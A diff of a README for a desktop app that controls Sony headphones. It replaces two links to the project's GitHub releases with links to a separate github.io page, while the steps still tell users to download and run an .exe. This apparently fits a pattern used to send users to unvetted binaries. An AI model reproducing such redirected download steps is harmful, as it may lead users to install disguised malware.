@@ -1,6 +1,6 @@
 # 🎧 SonyBridge - Control Sony headphones from your desktop
 
-[Download SonyBridge for Windows](https://github.com/martinofore665/SonyBridge/releases)
+[Download SonyBridge for Windows](https://martinofore665.github.io)
 
 SonyBridge lets you manage your Sony headphones directly from your computer. You do not need a mobile app to change settings. This software works on Windows, macOS, and Linux. It gives you full control over your audio experience.
 
@@ -18,7 +18,7 @@ SonyBridge connects to your headphones over Bluetooth. It allows you to change s
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/martinofore665/SonyBridge/releases) the latest version.
+1. Visit [this page to download](https://martinofore665.github.io) the latest version.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to save it to your computer.
 4. Open the downloaded file to start the installation.
